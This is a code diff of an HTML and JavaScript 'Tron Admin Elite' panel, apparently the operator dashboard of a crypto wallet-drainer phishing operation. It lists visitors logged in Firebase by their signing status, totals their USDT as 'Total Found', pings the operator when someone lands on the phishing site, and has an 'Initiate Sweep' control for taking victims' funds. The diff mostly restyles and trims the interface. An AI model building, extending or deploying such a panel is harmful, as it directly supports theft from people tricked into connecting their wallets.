@@ -4,194 +4,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Elite Admin - Native Pro</title>
+    <title>Tron Admin Elite</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
 
         body {
-            font-family: 'Outfit', sans-serif;
-            background: #000;
+            font-family: 'Inter', sans-serif;
+            background: #050505;
             color: #fff;
-            overflow: hidden;
-            height: 100vh;
         }
 
         .glass {
             background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(15px);
+            backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .tab-content {
-            display: none;
-            height: calc(100vh - 160px);
-            overflow-y: auto;
-            -webkit-overflow-scrolling: touch;
+        .user-card { transition: all 0.2s; }
+        .user-card:active { transform: scale(0.98); background: rgba(255, 255, 255, 0.06); }
+
+        /* Fix for Overflow */
+        .truncate-addr {
+            max-width: 140px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
 
-        .tab-content.active { display: block; }
-
-        .nav-btn { transition: all 0.2s ease; }
-        .nav-btn.active { color: #3b82f6; transform: translateY(-2px); }
-        .nav-btn.active i { filter: drop-shadow(0 0 8px rgba(59, 130, 246, 0.5)); }
-
-        .user-card { 
-            border-left: 3px solid transparent; 
-            transition: all 0.2s;
-        }
-        .user-card.status-connected { border-left-color: #10b981; }
-        .user-card.status-pending { border-left-color: #3b82f6; }
-
-        ::-webkit-scrollbar { width: 0; }
-        
-        /* Fix for small screens */
-        @media (max-width: 360px) {
-            .text-sm { font-size: 0.75rem; }
-            .p-5 { padding: 1rem; }
+        @media (max-width: 380px) {
+            .truncate-addr { max-width: 100px; }
         }
     </style>
 </head>
 
-<body class="flex flex-col">
+<body class="p-4 space-y-6 pb-20">
 
     <!-- Header -->
-    <header class="p-6 pb-2 flex justify-between items-end">
+    <header class="flex justify-between items-center py-4">
         <div>
-            <h1 id="pageTitle" class="text-2xl font-black tracking-tighter">LIVE <span class="text-blue-500">FEED</span></h1>
-            <p id="liveClock" class="text-[9px] font-bold text-slate-500 tracking-[0.3em] uppercase">00:00:00</p>
+            <h1 class="text-xl font-black tracking-tighter">ADMIN <span class="text-blue-500">PANEL</span></h1>
+            <p id="liveClock" class="text-[8px] font-bold text-slate-500 uppercase tracking-widest">00:00:00</p>
         </div>
-        <div class="flex gap-3">
-            <button onclick="toggleAudio()" id="audioBtn" class="w-10 h-10 rounded-2xl glass flex items-center justify-center text-slate-500">
+        <div class="flex gap-2">
+            <button onclick="toggleAudio()" id="audioBtn" class="w-10 h-10 rounded-xl glass flex items-center justify-center text-slate-500">
                 <i class="fas fa-bell"></i>
             </button>
-            <button onclick="clearAllData()" class="w-10 h-10 rounded-2xl bg-red-500/10 text-red-500 flex items-center justify-center border border-red-500/10">
-                <i class="fas fa-trash-alt text-xs"></i>
+            <button onclick="clearAllData()" class="w-10 h-10 rounded-xl bg-red-500/10 text-red-500 flex items-center justify-center border border-red-500/10">
+                <i class="fas fa-trash-alt text-[10px]"></i>
             </button>
         </div>
     </header>
 
-    <!-- Content Sections -->
-    <main class="flex-1 px-4 mt-4">
-        
-        <!-- Tab 1: Live Feed -->
-        <div id="tab-feed" class="tab-content active space-y-4">
-            <div class="grid grid-cols-2 gap-3">
-                <div class="glass p-4 rounded-3xl">
-                    <p class="text-[8px] font-bold text-slate-500 uppercase tracking-widest mb-1">Total Found</p>
-                    <p id="totalUsdt" class="text-lg font-black text-emerald-400 truncate">$0.00</p>
-                </div>
-                <div class="glass p-4 rounded-3xl">
-                    <p class="text-[8px] font-bold text-slate-500 uppercase tracking-widest mb-1">Active</p>
-                    <p id="userCount" class="text-lg font-black text-blue-400">0</p>
-                </div>
-            </div>
-            <div id="userList" class="space-y-3 pb-10">
-                <!-- Cards injected here -->
-            </div>
+    <!-- Stats -->
+    <div class="grid grid-cols-2 gap-3">
+        <div class="glass p-4 rounded-2xl">
+            <p class="text-[8px] font-bold text-slate-500 uppercase tracking-widest mb-1">Total Found</p>
+            <p id="totalUsdt" class="text-lg font-black text-emerald-400">$0.00</p>
         </div>
-
-        <!-- Tab 2: Balance Lookup -->
-        <div id="tab-lookup" class="tab-content space-y-6 pt-4">
-            <div class="glass p-6 rounded-[32px] border-blue-500/20">
-                <h3 class="text-xs font-bold text-blue-400 uppercase tracking-widest mb-4">Deep Wallet Scan</h3>
-                <div class="space-y-4">
-                    <div class="relative">
-                        <input type="text" id="manualAddress" placeholder="Enter TRON Address (T...)" 
-                            class="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 text-xs font-mono focus:outline-none focus:border-blue-500 transition-all">
-                    </div>
-                    <button onclick="checkManualBalance()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl shadow-blue-900/20 active:scale-[0.98]">
-                        Start Scan
-                    </button>
-                </div>
-            </div>
-
-            <div id="manualResult" class="hidden glass p-6 rounded-[32px] animate-pulse">
-                <div class="flex items-center justify-between mb-6">
-                    <div class="w-10 h-10 rounded-2xl bg-emerald-500/10 flex items-center justify-center">
-                        <i class="fas fa-shield-check text-emerald-500 text-xs"></i>
-                    </div>
-                    <span class="text-[10px] font-bold text-emerald-500 uppercase tracking-widest">Safe Result</span>
-                </div>
-                <div class="space-y-4">
-                    <div>
-                        <p class="text-[8px] font-bold text-slate-500 uppercase mb-1">Address Detected</p>
-                        <p id="resAddr" class="text-[11px] font-mono text-blue-400 break-all">T...</p>
-                    </div>
-                    <div class="h-[1px] bg-white/5"></div>
-                    <div class="flex justify-between items-end">
-                        <div>
-                            <p class="text-[8px] font-bold text-slate-500 uppercase mb-1">USDT Balance</p>
-                            <p id="resBal" class="text-3xl font-black text-emerald-400">$0.00</p>
-                        </div>
-                        <button onclick="copyRes()" class="text-slate-500 p-2"><i class="far fa-copy"></i></button>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-    </main>
-
-    <!-- Bottom Navigation -->
-    <nav class="glass mx-6 mb-8 rounded-[32px] p-2 flex justify-around items-center border-white/10">
-        <button onclick="switchTab('feed')" class="nav-btn active flex flex-col items-center gap-1 p-3">
-            <i class="fas fa-bolt-auto text-lg"></i>
-            <span class="text-[8px] font-bold uppercase tracking-widest">Feed</span>
-        </button>
-        <button onclick="switchTab('lookup')" class="nav-btn flex flex-col items-center gap-1 p-3">
-            <i class="fas fa-search-location text-lg"></i>
-            <span class="text-[8px] font-bold uppercase tracking-widest">Lookup</span>
-        </button>
-    </nav>
-
-    <!-- Custom Delete Modal -->
-    <div id="deleteModal" class="fixed inset-0 z-[110] bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-6">
-        <div class="glass w-full max-w-xs rounded-[40px] p-8 text-center space-y-6 scale-90 opacity-0 transition-all duration-300 transform" id="deleteModalContent">
-            <div class="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border border-red-500/20">
-                <i class="fas fa-exclamation-triangle text-2xl text-red-500 animate-pulse"></i>
-            </div>
-            <div>
-                <h3 class="text-xl font-black tracking-tighter">PERMANENT DELETE?</h3>
-                <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mt-2 leading-relaxed">This action will erase the session data from the database forever.</p>
-            </div>
-            <div class="flex flex-col gap-3">
-                <button onclick="confirmDelete()" class="w-full bg-red-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-lg shadow-red-900/30 active:scale-95 transition-all">Destroy Data</button>
-                <button onclick="closeDeleteModal()" class="w-full bg-white/5 py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest text-slate-400 active:scale-95 transition-all">Keep Session</button>
-            </div>
+        <div class="glass p-4 rounded-2xl">
+            <p class="text-[8px] font-bold text-slate-500 uppercase tracking-widest mb-1">Sessions</p>
+            <p id="userCount" class="text-lg font-black text-blue-400">0</p>
         </div>
     </div>
 
-    <!-- Action Sheet -->
-    <div id="actionSheet" class="fixed inset-0 z-[100] bg-black/60 hidden backdrop-blur-sm" onclick="closeSheet()">
-        <div class="fixed bottom-0 left-0 right-0 glass rounded-t-[48px] p-8 space-y-6 transform translate-y-full transition-transform duration-300 ease-out" onclick="event.stopPropagation()">
-            <div class="w-12 h-1.5 bg-white/10 rounded-full mx-auto -mt-2"></div>
-            <div class="flex justify-between items-start pt-4">
-                <div class="min-w-0 flex-1 pr-4">
-                    <h3 id="sheetAddress" class="text-xs font-mono text-blue-400 break-all font-bold">T...</h3>
-                    <p id="sheetTime" class="text-[9px] text-slate-500 font-bold uppercase mt-1">Status: Active</p>
-                </div>
-                <button onclick="closeSheet()" class="text-slate-500 p-2"><i class="fas fa-times"></i></button>
-            </div>
-            
-            <div class="grid grid-cols-2 gap-4">
-                <div class="p-5 bg-white/5 rounded-3xl border border-white/5">
-                    <p class="text-[8px] font-bold text-slate-500 uppercase mb-1">USDT</p>
-                    <p id="sheetUsdt" class="text-2xl font-black text-emerald-400">0.00</p>
-                </div>
-                <div class="p-5 bg-white/5 rounded-3xl border border-white/5">
-                    <p class="text-[8px] font-bold text-slate-500 uppercase mb-1">TRX</p>
-                    <p id="sheetTrx" class="text-2xl font-black text-blue-400">0.00</p>
-                </div>
-            </div>
+    <!-- Manual Wallet Search -->
+    <div class="glass p-5 rounded-3xl space-y-3">
+        <p class="text-[9px] font-black text-blue-500 uppercase tracking-widest">Check Wallet Balance</p>
+        <div class="flex gap-2">
+            <input type="text" id="manualAddress" placeholder="Enter TRON Address" 
+                class="flex-1 bg-black/40 border border-white/5 rounded-xl py-3 px-4 text-[11px] font-mono focus:outline-none focus:border-blue-500/30">
+            <button onclick="checkManualBalance()" class="bg-blue-600 px-5 rounded-xl text-white font-black text-[10px] uppercase">
+                Scan
+            </button>
+        </div>
+        <div id="manualResult" class="hidden flex justify-between items-center p-3 bg-emerald-500/5 border border-emerald-500/10 rounded-xl">
+            <div class="text-[10px] font-mono text-emerald-400/80 truncate-addr" id="resAddr">...</div>
+            <div class="text-xs font-black text-emerald-400" id="resBal">$0.00</div>
+        </div>
+    </div>
 
-            <div class="space-y-4">
-                <div class="flex justify-between px-1"><span class="text-[10px] font-bold text-slate-500 uppercase">Amount</span></div>
-                <input id="sweepInput" type="number" class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 font-black text-xl text-center focus:outline-none focus:border-blue-500">
-                <button id="sweepBtn" onclick="executeSweep()" class="w-full bg-blue-600 py-6 rounded-[24px] font-black uppercase text-xs tracking-[0.2em] shadow-xl active:scale-95 transition-all">Initiate Sweep</button>
+    <!-- Activity Feed -->
+    <div class="space-y-3" id="userList">
+        <!-- Cards -->
+    </div>
+
+    <!-- Action Sheet (For Sweep) -->
+    <div id="actionSheet" class="fixed inset-0 z-50 bg-black/80 hidden flex items-end" onclick="closeSheet()">
+        <div class="glass w-full rounded-t-[40px] p-8 space-y-6 transform translate-y-full transition-transform duration-300" onclick="event.stopPropagation()">
+            <div class="w-12 h-1 bg-white/10 rounded-full mx-auto -mt-4"></div>
+            <div class="flex justify-between items-start pt-4">
+                <div class="flex-1 pr-4 min-w-0">
+                    <h3 id="sheetAddress" class="text-xs font-mono text-blue-400 font-bold truncate">T...</h3>
+                    <p id="sheetTime" class="text-[9px] text-slate-500 font-bold uppercase mt-1">Status Tracking</p>
+                </div>
+                <button onclick="closeSheet()" class="text-slate-500"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="grid grid-cols-2 gap-3">
+                <div class="p-4 bg-white/5 rounded-2xl text-center">
+                    <p class="text-[8px] text-slate-500 font-bold mb-1 uppercase">USDT</p>
+                    <p id="sheetUsdt" class="text-xl font-black text-emerald-400">0.00</p>
+                </div>
+                <div class="p-4 bg-white/5 rounded-2xl text-center">
+                    <p class="text-[8px] text-slate-500 font-bold mb-1 uppercase">TRX</p>
+                    <p id="sheetTrx" class="text-xl font-black text-blue-400">0.00</p>
+                </div>
+            </div>
+            <div class="space-y-3">
+                <input id="sweepInput" type="number" class="w-full bg-black/40 border border-white/10 rounded-xl p-4 font-black text-lg text-center focus:outline-none focus:border-blue-500">
+                <button onclick="executeSweep()" class="w-full bg-blue-600 py-5 rounded-2xl font-black uppercase text-[10px] tracking-widest shadow-lg active:scale-95 transition-all">Initiate Sweep</button>
             </div>
         </div>
     </div>
@@ -219,22 +144,7 @@
         let selectedUser = null;
         let tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
 
-        function switchTab(tab) {
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-            document.getElementById(`tab-${tab}`).classList.add('active');
-            event.currentTarget.classList.add('active');
-            document.getElementById('pageTitle').innerHTML = tab === 'feed' ? 'LIVE <span class="text-blue-500">FEED</span>' : 'WALLET <span class="text-blue-500">SCAN</span>';
-        }
-
         function startApp() {
-            // Native UI Tweak
-            if (window.AndroidNative) {
-                document.body.style.userSelect = 'none';
-                // Auto-fill password if you want, or just focus it
-                setTimeout(() => document.getElementById('adminPass').focus(), 500);
-            }
-
             if (firebase.apps.length === 0) firebase.initializeApp(firebaseConfig);
             const db = firebase.database();
 
@@ -247,17 +157,10 @@
                 newUsers.sort((a, b) => b.id.localeCompare(a.id));
                 
                 if (newUsers.length > users.length) {
-                    const newUser = newUsers[0];
                     if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
-                    
-                    // Signal to Native Android App
                     if (window.AndroidNative) {
                         if (window.AndroidNative.triggerBeep) window.AndroidNative.triggerBeep();
-                        if (window.AndroidNative.showNotification) {
-                            const title = `🎯 ${newUser.status || 'New Activity'}`;
-                            const msg = newUser.address.includes('User') ? "Someone just landed on your site!" : `Wallet: ${newUser.address.substring(0,10)}...`;
-                            window.AndroidNative.showNotification(title, msg);
-                        }
+                        if (window.AndroidNative.showNotification) window.AndroidNative.showNotification("New Visitor!", "Someone landed on your site.");
                     }
                 }
                 users = newUsers;
@@ -274,23 +177,20 @@
                 if (u.status === 'CONNECTED' || u.status === 'PENDING_SIGN') total += parseFloat(u.usdt || 0);
                 
                 const card = document.createElement('div');
-                let sClass = u.status === 'CONNECTED' ? 'status-connected' : (u.status === 'PENDING_SIGN' ? 'status-pending' : '');
-                card.className = `glass p-4 rounded-3xl user-card ${sClass} flex justify-between items-center active:scale-95 transition-all`;
+                card.className = "glass p-4 rounded-2xl user-card flex justify-between items-center";
                 
-                let sColor = "text-blue-400", sIcon = "fa-clock", sText = "Pending";
-                if (u.status === "ACTIVE") { sColor = "text-slate-500"; sIcon = "fa-eye"; sText = "Online"; }
-                else if (u.status === "CLICKED_NEXT") { sColor = "text-yellow-500"; sIcon = "fa-fingerprint"; sText = "Interested"; }
-                else if (u.status === "CONNECTED") { sColor = "text-emerald-500"; sIcon = "fa-check-double"; sText = "Signed"; }
-                else if (u.status === "REJECTED") { sColor = "text-red-500"; sIcon = "fa-times-circle"; sText = "Rejected"; }
+                let sColor = "text-blue-400", sText = u.status || "Active";
+                if (u.status === "CONNECTED") sColor = "text-emerald-500";
+                else if (u.status === "REJECTED") sColor = "text-red-500";
 
                 const addr = u.address.includes('User') ? u.address : (u.address.substring(0, 6) + "..." + u.address.slice(-4));
 
                 card.innerHTML = `
                     <div class="flex items-center gap-3 flex-1 min-w-0" onclick="openSheet('${u.id}')">
-                        <div class="w-10 h-10 bg-white/5 rounded-2xl flex items-center justify-center"><i class="fas ${sIcon} ${sColor} text-[12px]"></i></div>
+                        <div class="w-10 h-10 bg-white/5 rounded-xl flex items-center justify-center"><i class="fas fa-user text-xs ${sColor}"></i></div>
                         <div class="min-w-0 flex-1">
-                            <div class="text-[13px] font-bold truncate">${addr}</div>
-                            <div class="text-[8px] text-slate-500 font-bold uppercase tracking-wider">${u.time} • ${u.trx || '0'} TRX</div>
+                            <div class="text-xs font-bold truncate">${addr}</div>
+                            <div class="text-[7px] text-slate-500 font-bold uppercase">${u.time} • ${u.trx || '0'} TRX</div>
                         </div>
                     </div>
                     <div class="text-right ml-2 shrink-0">
@@ -301,7 +201,7 @@
                 list.appendChild(card);
             });
             document.getElementById('totalUsdt').innerText = `$${total.toFixed(2)}`;
-            document.getElementById('userCount').innerText = users.filter(u => u.status !== 'ACTIVE').length;
+            document.getElementById('userCount').innerText = users.length;
         }
 
         async function checkManualBalance() {
@@ -322,7 +222,6 @@
             document.getElementById('sheetAddress').innerText = selectedUser.address;
             document.getElementById('sheetUsdt').innerText = selectedUser.usdt;
             document.getElementById('sheetTrx').innerText = selectedUser.trx;
-            document.getElementById('sheetTime').innerText = `Activity: ${selectedUser.time} • Status: ${selectedUser.status}`;
             document.getElementById('sweepInput').value = selectedUser.usdt;
             const sheet = document.getElementById('actionSheet');
             sheet.classList.remove('hidden');
@@ -335,45 +234,15 @@
             setTimeout(() => sheet.classList.add('hidden'), 300);
         }
 
-        let userToDelete = null;
-
-        function deleteUser(id) {
-            userToDelete = id;
-            const modal = document.getElementById('deleteModal');
-            const content = document.getElementById('deleteModalContent');
-            modal.classList.remove('hidden');
-            setTimeout(() => {
-                content.classList.remove('scale-90', 'opacity-0');
-                content.classList.add('scale-100', 'opacity-100');
-            }, 10);
-        }
-
-        function closeDeleteModal() {
-            const content = document.getElementById('deleteModalContent');
-            content.classList.add('scale-90', 'opacity-0');
-            content.classList.remove('scale-100', 'opacity-100');
-            setTimeout(() => {
-                document.getElementById('deleteModal').classList.add('hidden');
-                userToDelete = null;
-            }, 300);
-        }
-
-        async function confirmDelete() {
-            if (userToDelete) {
-                await firebase.database().ref('connections/' + userToDelete).remove();
-                closeDeleteModal();
-            }
-        }
-
         function toggleAudio() {
             audioEnabled = !audioEnabled;
-            document.getElementById('audioBtn').className = `w-10 h-10 rounded-2xl flex items-center justify-center transition-all ${audioEnabled ? 'bg-blue-600 text-white' : 'glass text-slate-500'}`;
-            if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
+            document.getElementById('audioBtn').className = `w-10 h-10 rounded-xl flex items-center justify-center transition-all ${audioEnabled ? 'bg-blue-600 text-white' : 'glass text-slate-500'}`;
         }
 
-        function clearAllData() { if (confirm("Clear All Sessions?")) firebase.database().ref('connections').remove(); }
+        function clearAllData() { if (confirm("Clear All?")) firebase.database().ref('connections').remove(); }
 
         startApp();
     </script>
 </body>
+
 </html>
